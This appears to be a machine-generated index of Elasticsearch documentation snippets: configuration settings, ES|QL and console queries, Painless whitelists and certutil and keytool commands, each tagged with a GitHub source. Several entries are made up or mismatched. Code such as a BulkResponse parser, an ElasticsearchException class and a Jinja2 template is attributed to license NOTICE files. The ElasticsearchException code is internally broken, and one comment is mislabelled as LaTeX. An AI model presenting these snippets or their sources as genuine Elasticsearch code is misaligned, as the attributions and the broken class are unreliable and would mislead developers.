()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Discovery Type in Elasticsearch\nDESCRIPTION: Static setting that determines if Elasticsearch should form a single-node or multi-node cluster. Defaults to multi-node for normal cluster operation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/discovery-cluster-formation-settings.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\ndiscovery.type: multi-node\n```\n\n----------------------------------------\n\nTITLE: Random Number Generation in Java\nDESCRIPTION: Generates pseudo-random numbers across various data types with configurable ranges and distributions\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_30\n\nLANGUAGE: java\nCODE:\n```\nclass java.util.Random {\n  boolean nextBoolean()\n  double nextDouble()\n  int nextInt()\n  long nextLong()\n}\n```\n\n----------------------------------------\n\nTITLE: Examples of Output Entries from Public Callers Finder\nDESCRIPTION: Example output entries showing how methods are reported by the Public Callers Finder tool. Each entry corresponds to a method call found in the analysis, showcasing relevant details such as the method name, class name, and visibility.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/entitlement/tools/public-callers-finder/README.md#2025-04-21_snippet_3\n\nLANGUAGE: text\nCODE:\n```\njava.base\tDeleteOnExitHook.java\t50\tjava/io/DeleteOnExitHook$1\trun\t()V\tPUBLIC\tjava.base\tjava/io/File\tdelete\tPUBLIC\njava.base\tZipFile.java\t254\tjava/util/zip/ZipFile\t<init>\t(Ljava/io/File;ILjava/nio/charset/Charset;)V\tPUBLIC\tjava.base\tjava/io/File\tdelete\tPUBLIC\njava.logging\tFileHandler.java\t279\tjava/util/logging/FileHandler\t<init>\t()V\tPUBLIC\tjava.base\tjava/io/File\tdelete\tPUBLIC\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice Template\nDESCRIPTION: A template for the boilerplate notice that should be attached to works licensed under Apache License 2.0. It includes placeholders for copyright year and owner information, along with the standard license text and link to the full license.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/licenses/guava-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n   Copyright [yyyy] [name of copyright owner]\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Configuring Required Claims in JWT Realm\nDESCRIPTION: Example configuration showing how to set required claims in a JWT realm named 'jwt1'. Demonstrates setting token_use and versions claims with specific allowed values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_15\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.authc.realms.jwt.jwt1:\n  required_claims:\n    token_use: \"id\"\n    versions: [\"1.0\", \"2.0\"]\n```\n\n----------------------------------------\n\nTITLE: ES|QL Full-text Search Example (Invalid)\nDESCRIPTION: This example demonstrates an invalid ES|QL query using the MATCH function within a WHERE clause, but separated from the FROM clause by a STATS command. This separation causes a validation error because the MATCH function must be used directly after the FROM command.  The query attempts to filter books by author after calculating the average price by author.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/limitations.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\n\nFROM books\n| STATS AVG(price) BY author\n| WHERE MATCH(author, \"Faulkner\")\n\n```\n\n----------------------------------------\n\nTITLE: Sample Advanced Sync Rules for GMail Connector\nDESCRIPTION: This JSON snippet specifies advanced sync rules for a GMail connector using GMail advanced search syntax. It filters messages based on given criteria such as date and sender. No additional dependencies are required, but it assumes the connector has access to the necessary GMail account and permissions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-gmail.md#2025-04-21_snippet_4\n\nLANGUAGE: js\nCODE:\n```\n{\n  \\\"messages\\\": [\n    \\\"before:2021/10/10\\\",\n    \\\"from:amy\\\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Correct Multi-field Copy_to Configuration in Elasticsearch\nDESCRIPTION: This example demonstrates the correct way to copy values from one field to multiple target fields in Elasticsearch. It shows how to directly copy from the source field to multiple destination fields using an array.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/copy-to.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT good_example_index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"field_1\": {\n        \"type\": \"text\",\n        \"copy_to\": [\"field_2\", \"field_3\"]\n      },\n      \"field_2\": {\n        \"type\": \"text\"\n      },\n      \"field_3\": {\n        \"type\": \"text\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using TEST Marker with Modifiers in Elasticsearch Docs\nDESCRIPTION: Examples of using the TEST marker with various modifiers for controlling test execution and expectations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/README.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n% TEST[s/foo/bar/]\n% TEST[catch:foo]\n% TEST[continued]\n% TEST[skip:reason]\n% TEST[setup:name]\n% TEST[teardown:name]\n% TEST[warning:some warning]\n```\n\n----------------------------------------\n\nTITLE: ESQL Spatial Extent Function Documentation Comment\nDESCRIPTION: Comment header explaining that this is an auto-generated file by ESQL's AbstractFunctionTestCase, with a warning not to edit directly and instructions for regeneration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/st_extent_agg.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Extracting IP Addresses with Painless Runtime IP Field Context\nDESCRIPTION: This script uses the ip_field context to extract an IP address from an Apache log pattern using grok pattern matching. It emits only the IP address from the log message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_15\n\nLANGUAGE: console\nCODE:\n```\nPOST /_scripts/painless/_execute\n{\n  \"script\": {\n    \"source\": \"\"\"\n      String clientip=grok('%{COMMONAPACHELOG}').extract(doc[\\\"message\\\"].value)?.clientip;\n      if (clientip != null) emit(clientip);\n    \"\"\"\n  },\n  \"context\": \"ip_field\",\n  \"context_setup\": {\n    \"index\": \"my-index-000001\",\n    \"document\": {\n      \"message\": \"40.135.0.0 - - [30/Apr/2020:14:30:17 -0500] \\\"GET /images/hm_bg.jpg HTTP/1.0\\\" 200 24736\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Index documents into Elasticsearch\nDESCRIPTION: This snippet indexes three documents into the `items` index, each containing a `name`, `production_date`, and `location`. These documents can be used to test and demonstrate the distance_feature query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-distance-feature-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /items/_doc/1?refresh\n{\n  \"name\" : \"chocolate\",\n  \"production_date\": \"2018-02-01\",\n  \"location\": [-71.34, 41.12]\n}\n\nPUT /items/_doc/2?refresh\n{\n  \"name\" : \"chocolate\",\n  \"production_date\": \"2018-01-01\",\n  \"location\": [-71.3, 41.15]\n}\n\n\nPUT /items/_doc/3?refresh\n{\n  \"name\" : \"chocolate\",\n  \"production_date\": \"2017-12-01\",\n  \"location\": [-71.3, 41.12]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring ICU Normalization Token Filter in Elasticsearch\nDESCRIPTION: Example showing how to configure both default (nfkc_cf) and custom (nfc) normalization filters in Elasticsearch. Demonstrates setting up custom analyzers with different normalization modes and the ICU tokenizer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-icu-normalization.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT icu_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"nfkc_cf_normalized\": {\n            \"tokenizer\": \"icu_tokenizer\",\n            \"filter\": [\n              \"icu_normalizer\"\n            ]\n          },\n          \"nfc_normalized\": {\n            \"tokenizer\": \"icu_tokenizer\",\n            \"filter\": [\n              \"nfc_normalizer\"\n            ]\n          }\n        },\n        \"filter\": {\n          \"nfc_normalizer\": {\n            \"type\": \"icu_normalizer\",\n            \"name\": \"nfc\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Computing ST DISTANCE using ESQL\nDESCRIPTION: This snippet performs a distance calculation between airport locations and city locations using the ST_DISTANCE function. It filters for airports with the abbreviation 'CPH' and retains specific fields, including the calculated distance. The required inputs are the locations of the airport and the city, and the output includes the abbreviation, name, locations, and computed distance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/st_distance.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airports\n| WHERE abbrev == \"CPH\"\n| EVAL distance = ST_DISTANCE(location, city_location)\n| KEEP abbrev, name, location, city_location, distance\n```\n\n----------------------------------------\n\nTITLE: DayOfWeek Enum Methods and Fields\nDESCRIPTION: Describes the enum constants and methods of java.time.DayOfWeek. Summarizes how to represent and manipulate days of the week, including obtaining a DayOfWeek from a value, retrieving localized names, and performing arithmetic operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_18\n\nLANGUAGE: java\nCODE:\n```\n\"class java.time.DayOfWeek {\n  DayOfWeek FRIDAY\n  DayOfWeek MONDAY\n  DayOfWeek SATURDAY\n  DayOfWeek SUNDAY\n  DayOfWeek THURSDAY\n  DayOfWeek TUESDAY\n  DayOfWeek WEDNESDAY\n  DayOfWeek of(int)\n  DayOfWeek from(TemporalAccessor)\n  int getValue()\n  String getDisplayName(TextStyle,Locale)\n  DayOfWeek minus(long)\n  DayOfWeek plus(long)\n  DayOfWeek valueOf(String)\n  DayOfWeek[] values()\n}\"\n```\n\n----------------------------------------\n\nTITLE: Downloading Configuration File for Connector\nDESCRIPTION: Shell command to download the sample configuration file for Elastic connectors from the GitHub repository.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-salesforce.md#2025-04-21_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\ncurl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Analysis Predicate Context Variables and Types\nDESCRIPTION: Defines the available variables and their types in the analysis predicate context. Includes token properties like term, position, offsets, and type information. The script must return a boolean indicating whether the current token matches the predicate.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-analysis-predicate-context.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\n// Available variables:\nMap params;                    // read-only user parameters\nCharSequence token.term;        // token characters\nint token.position;            // token position\nint token.positionIncrement;   // position increment\nint token.positionLength;      // position length\nint token.startOffset;         // start offset\nint token.endOffset;           // end offset\nString token.type;             // token type\nboolean token.keyword;         // keyword flag\n\n// Must return:\nboolean                        // whether token matches predicate\n```\n\n----------------------------------------\n\nTITLE: Named Queries Example in Elasticsearch\nDESCRIPTION: This example demonstrates the use of named queries within a boolean query in Elasticsearch. Each query (`match` and `terms`) is assigned a `_name`. The response will include a `matched_queries` property for each hit, indicating which named queries matched.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-bool-query.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"bool\": {\n      \"should\": [\n        { \"match\": { \"name.first\": { \"query\": \"shay\", \"_name\": \"first\" } } },\n        { \"match\": { \"name.last\": { \"query\": \"banon\", \"_name\": \"last\" } } }\n      ],\n      \"filter\": {\n        \"terms\": {\n          \"name.last\": [ \"banon\", \"kimchy\" ],\n          \"_name\": \"test\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Parsing Elasticsearch BulkResponse with Optional Error Handling\nDESCRIPTION: This code demonstrates how to implement a BulkResponse parser that efficiently handles error checking. It only processes error objects when the hasErrors flag is true, avoiding unnecessary parsing of potentially large error objects when no errors are present.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/sql-cli/licenses/jline-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nfinal Map<String, Object> bulkResponseMap = ...;\nfinal boolean hasErrors = (boolean) bulkResponseMap.get(\"errors\");\n// only process the items when there are errors\nif (hasErrors) {\n    final List<Map<String, Object>> items = (List<Map<String, Object>>) bulkResponseMap.get(\"items\");\n    for (Map<String, Object> item : items) {\n        // Do something with the error.  \n    }\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Test Case Comment\nDESCRIPTION: A comment indicating that this file is auto-generated by ESQL's AbstractFunctionTestCase and should not be edited manually. It also provides a reference to the README for instructions on regenerating the file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/pi.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Searching Data in ElasticSearch with JavaScript\nDESCRIPTION: This snippet performs a search query in ElasticSearch to retrieve documents matching a specific keyword, such as '制限スピード'. It uses the JavaScript client to execute the search and outputs the results, suitable for analysis or display.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-kuromoji/src/test/resources/org/elasticsearch/plugin/analysis/kuromoji/user_dict.txt#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nasync function searchDocuments(indexName, queryText) {\n  try {\n    const result = await client.search({\n      index: indexName,\n      body: {\n        query: {\n          match: { test_name: queryText }\n        }\n      }\n    });\n    console.log('Search results:', result.body.hits.hits);\n  } catch (error) {\n    console.error('Search error:', error);\n  }\n}\n\n// Example usage:\n// searchDocuments('test_index', '制限スピード');\n```\n\n----------------------------------------\n\nTITLE: Configuring Automata Settings for Security in Elasticsearch YAML\nDESCRIPTION: These YAML settings control the behavior of automata used in security-related pattern matching, including state limits, caching, and cache TTL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.automata.max_determinized_states: 100000\nxpack.security.automata.cache.enabled: true\nxpack.security.automata.cache.size: 10000\nxpack.security.automata.cache.ttl: 48h\n```\n\n----------------------------------------\n\nTITLE: Date Range Formatting in Synthetic Source\nDESCRIPTION: This snippet illustrates how date ranges are formatted in synthetic source using the default format or a provided format. It shows the conversion of timestamp and string date representations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/range.md#2025-04-22_snippet_10\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"my_range\": { \"type\": \"date_range\" }\n    }\n  }\n}\n\nPUT idx/_doc/1\n{\n  \"my_range\": [\n    {\n      \"gte\": 1504224000000,\n      \"lte\": 1504569600000\n    },\n    {\n      \"gte\": \"2017-09-01\",\n      \"lte\": \"2017-09-10\"\n    }\n  ]\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"my_range\": [\n    {\n      \"gte\": \"2017-09-01T00:00:00.000Z\",\n      \"lte\": \"2017-09-05T00:00:00.000Z\"\n    },\n    {\n      \"gte\": \"2017-09-01T00:00:00.000Z\",\n      \"lte\": \"2017-09-10T23:59:59.999Z\"\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Interactive Program Notice\nDESCRIPTION: This snippet presents a template for a short notice to be displayed when an interactive program starts. It includes the program's name, copyright information, a strong disclaimer of warranty, and instructions for viewing license details. It assumes the existence of commands or actions to display the license terms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-xml-module-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: plaintext\nCODE:\n```\n\"    Gnomovision version 69, Copyright (C) year name of author\n    Gnomovision comes with ABSOLUTELY NO WARRANTY; for details type\n    `show w'. This is free software, and you are welcome to redistribute\n    it under certain conditions; type `show c' for details.\"\n```\n\n----------------------------------------\n\nTITLE: Defining ElasticsearchException Class in Java\nDESCRIPTION: Defines the ElasticsearchException class, which extends RuntimeException and implements ToXContentFragment. It includes constructors for various error scenarios and methods for handling error details.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-azure/licenses/reactive-streams-NOTICE.txt#2025-04-22_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\npublic class ElasticsearchException extends RuntimeException implements ToXContentFragment {\n\n    private final Supplier<ElasticsearchException> suppressed = new Supplier<ElasticsearchException>() {\n        @Override\n        public ElasticsearchException get() {\n            return ElasticsearchException.this;\n        }\n    };\n\n    public ElasticsearchException(StreamInput in) throws IOException {\n        super(in.readOptionalString());\n        readStackTrace(this, in);\n        headers.addAll(in.readMapOfLists(StreamInput::readString, StreamInput::readString));\n    }\n\n    // ... (additional constructors and methods)\n\n    public final Throwable[] getSuppressed() {\n        return super.getSuppressed();\n    }\n\n    public ElasticsearchException addSuppressed(ElasticsearchException suppressed) {\n        this.suppressed().addSuppressed(suppressed);\n        return this;\n    }\n\n    // ... (additional methods)\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Galician Stop Words\nDESCRIPTION: Lists the Galician stop words to be used in Elasticsearch text analysis, with a Lucene stop words link.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_19\n\nLANGUAGE: markdown\nCODE:\n```\n`_galician_`\n:   [Galician stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/gl/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Field Access Grammar Definition in Painless\nDESCRIPTION: Grammar specification for field access operator in Painless scripting language.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nfield_access: '.' ID;\n```\n\n----------------------------------------\n\nTITLE: Defining IllegalMonitorStateException in Java\nDESCRIPTION: This snippet defines the java.lang.IllegalMonitorStateException class, thrown to indicate that a thread has attempted to wait on an object's monitor or to notify other threads waiting on an object's monitor without owning the specified monitor. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_36\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.IllegalMonitorStateException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Cluster State Output Example\nDESCRIPTION: Example output showing the term and version of a cluster state during unsafe bootstrap operation. The output displays the current node's cluster state information in the format (term, version).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/node-tool.md#2025-04-21_snippet_2\n\nLANGUAGE: txt\nCODE:\n```\nCurrent node cluster state (term, version) pair is (4, 12)\n```\n\n----------------------------------------\n\nTITLE: CIDR_MATCH Function Documentation Header\nDESCRIPTION: Markdown comment indicating the auto-generated nature of the documentation\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/cidr_match.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Defining InternalSqlScriptUtils Class for SQL Scripting in Java\nDESCRIPTION: This snippet defines the InternalSqlScriptUtils class with various mathematical, date/time, ASCII, geo, and casting functions for use in SQL scripting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/main/resources/org/elasticsearch/xpack/sql/plugin/sql_whitelist.txt#2025-04-21_snippet_5\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.xpack.sql.expression.function.scalar.whitelist.InternalSqlScriptUtils {\n#\n# Conditional\n#\n  def coalesce(java.util.List)\n  def greatest(java.util.List)\n  def least(java.util.List)\n  def nullif(Object, Object)\n\n#\n# Math\n#\n  def add(Object, Object)\n  def sub(Object, Object)\n  def div(Object, Object)\n  def mod(Object, Object)\n  def mul(Object, Object)\n  Number atan2(Number, Number)\n  Number neg(Number)\n  Number power(Number, Number)\n  Number round(Number, Number)\n  Number truncate(Number, Number)\n\n  Number abs(Number)\n  Number acos(Number)\n  Number asin(Number)\n  Number atan(Number)\n  Number cbrt(Number)\n  Number ceil(Number)\n  Number cos(Number)\n  Number cosh(Number)\n  Number cot(Number)\n  Number degrees(Number)\n  Number e(Number)\n  Number exp(Number)\n  Number expm1(Number)\n  Number floor(Number)\n  Number log(Number)\n  Number log10(Number)\n  Number pi(Number)\n  Number radians(Number)\n  Number random(Number)\n  Number sign(Number)\n  Number sin(Number)\n  Number sinh(Number)\n  Number sqrt(Number)\n  Number tan(Number)\n\n#\n# Date/Time functions\n#\n  Integer dateTimeChrono(Object, String, String)\n  Integer dateTimeExtract(Object, String, String)\n  String  dayName(Object, String)\n  Integer dayOfWeek(Object, String)\n  String  monthName(Object, String)\n  Integer quarter(Object, String)\n  Integer weekOfYear(Object, String)\n  ZonedDateTime dateAdd(String, Integer, Object, String)\n  Integer dateDiff(String, Object, Object, String)\n  def dateTrunc(String, Object, String)\n  def dateParse(String, String, String)\n  Integer datePart(String, Object, String)\n  String dateFormat(Object, String, String)\n  String dateTimeFormat(Object, String, String)\n  String format(Object, String, String)\n  String toChar(Object, String, String)\n  def dateTimeParse(String, String, String)\n  def timeParse(String, String, String)\n  IntervalDayTime intervalDayTime(String, String)\n  IntervalYearMonth intervalYearMonth(String, String)\n  ZonedDateTime asDateTime(Object)\n  OffsetTime asTime(String)\n\n#\n# ASCII Functions\n#\n  Integer ascii(String)\n  Integer bitLength(String)\n  String  character(Number)\n  Integer charLength(String)\n  String  concat(String, String)\n  String  insert(String, Number, Number, String)\n  String  lcase(String)\n  String  left(String, Number)\n  Integer length(String)\n  Integer locate(String, String)\n  Integer locate(String, String, Number)\n  String  ltrim(String)\n  Integer octetLength(String)\n  Integer position(String, String)\n  String  repeat(String, Number)\n  String  replace(String, String, String)\n  String  right(String, Number)\n  String  rtrim(String)\n  String  space(Number)\n  String  substring(String, Number, Number)\n  String  trim(String)\n  String  ucase(String)\n\n#\n# Geo Functions\n#\n  GeoShape geoDocValue(java.util.Map, String)\n  String   stAswkt(Object)\n  Double   stDistance(Object, Object)\n  String   stGeometryType(Object)\n  GeoShape stWktToSql(String)\n  Double   stX(Object)\n  Double   stY(Object)\n  Double   stZ(Object)\n\n#\n# Casting\n#\n  def cast(Object, String)\n}\n```\n\n----------------------------------------\n\nTITLE: String Concatenation Compound Assignment\nDESCRIPTION: Demonstrates string concatenation using compound assignment operator.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-general.md#2025-04-21_snippet_8\n\nLANGUAGE: painless\nCODE:\n```\nString s = 'compound';\ns += ' assignment';\n```\n\n----------------------------------------\n\nTITLE: Read Security Privilege\nDESCRIPTION: Read-only access to security-related operations including user management, API keys, and role mappings\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/security-privileges.md#2025-04-21_snippet_12\n\nLANGUAGE: markdown\nCODE:\n```\nread_security\n```\n\n----------------------------------------\n\nTITLE: Converting CAs to JKS Format\nDESCRIPTION: This snippet converts created CAs into the Java KeyStore (JKS) format, ensuring compatibility with Java-based applications.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/ssl-config/src/test/resources/certs/README.txt#2025-04-21_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\n# 7. Convert CAs to JKS\n\nfor n in 1 2 3\ndo\n    keytool -importcert -file ca${n}/ca.crt -alias ca${n} -keystore ca-all/ca.jks -storetype jks -storepass jks-pass -v \ndone\n```\n\n----------------------------------------\n\nTITLE: Value Count Aggregation on Histogram Fields in Elasticsearch\nDESCRIPTION: Illustrates how to use value count aggregation on histogram fields. It includes examples of indexing documents with histogram data and performing the aggregation, which sums all numbers in the 'counts' array of the histograms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-valuecount-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT metrics_index/_doc/1\n{\n  \"network.name\" : \"net-1\",\n  \"latency_histo\" : {\n      \"values\" : [0.1, 0.2, 0.3, 0.4, 0.5],\n      \"counts\" : [3, 7, 23, 12, 6]\n   }\n}\n\nPUT metrics_index/_doc/2\n{\n  \"network.name\" : \"net-2\",\n  \"latency_histo\" : {\n      \"values\" :  [0.1, 0.2, 0.3, 0.4, 0.5],\n      \"counts\" : [8, 17, 8, 7, 6]\n   }\n}\n\nPOST /metrics_index/_search?size=0\n{\n  \"aggs\": {\n    \"total_requests\": {\n      \"value_count\": { \"field\": \"latency_histo\" }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"total_requests\": {\n      \"value\": 97\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Multi-line Jinja2 Template for Elasticsearch Network Settings\nDESCRIPTION: An example of a multi-line Jinja2 template for Elasticsearch network configuration. It demonstrates setting up network binding using host values with a default fallback to localhost.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/distribution/tools/ansi-console/licenses/jansi-NOTICE.txt#2025-04-21_snippet_5\n\nLANGUAGE: text\nCODE:\n```\nnetwork:\n  host: {{ network_host | default('_local_') }}\n```\n\n----------------------------------------\n\nTITLE: Resetting User Password\nDESCRIPTION: Example showing how to reset password for user 'jachnich' using interactive mode.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/users-command.md#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-users passwd jachnich\n```\n\n----------------------------------------\n\nTITLE: ESQL convert_to Function Documentation Comment in LaTeX\nDESCRIPTION: This LaTeX comment indicates that the file is automatically generated by ESQL's AbstractFunctionTestCase and should not be edited manually. It refers to a README.md file for regeneration instructions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/to_timeduration.md#2025-04-21_snippet_0\n\nLANGUAGE: latex\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Generating CA Certificate with Elasticsearch Certutil\nDESCRIPTION: This command generates a CA (Certificate Authority) certificate using the `elasticsearch-certutil` tool. It specifies the output file as `ca.p12`, sets a password, and configures the certificate to be valid for 9999 days. The CA certificate is used to sign other certificates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/reindex/src/test/resources/org/elasticsearch/reindex/README.txt#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ES_HOME/bin/elasticsearch-certutil ca --out ca.p12 --pass \"ca-password\" --days 9999\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Types Table in Markdown\nDESCRIPTION: This snippet presents a markdown table showing the supported input field types and their corresponding result types for a specific ESQL function. It includes geo_point, keyword, and text as input types, all resulting in geo_point output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/to_geopoint.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| geo_point | geo_point |\n| keyword | geo_point |\n| text | geo_point |\n```\n\n----------------------------------------\n\nTITLE: JOIN Operations - JavaScript\nDESCRIPTION: This snippet illustrates a `JOIN` operation using Elastic Search PostgreSQL connector. It demonstrates joining the `employee` and `customer` tables on matching IDs, illustrating advanced relational queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-postgresql.md#2025-04-21_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\n[\n  {\n    \"tables\": [\"employee\", \"customer\"],\n    \"query\": \"SELECT * FROM employee INNER JOIN customer ON employee.emp_id = customer.c_id\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Basic Change Point Aggregation Syntax in Elasticsearch\nDESCRIPTION: Demonstrates the basic syntax for a change_point aggregation, specifying the buckets_path parameter to indicate which buckets to analyze for changes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-change-point-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"change_point\": {\n    \"buckets_path\": \"date_histogram>_count\"\n  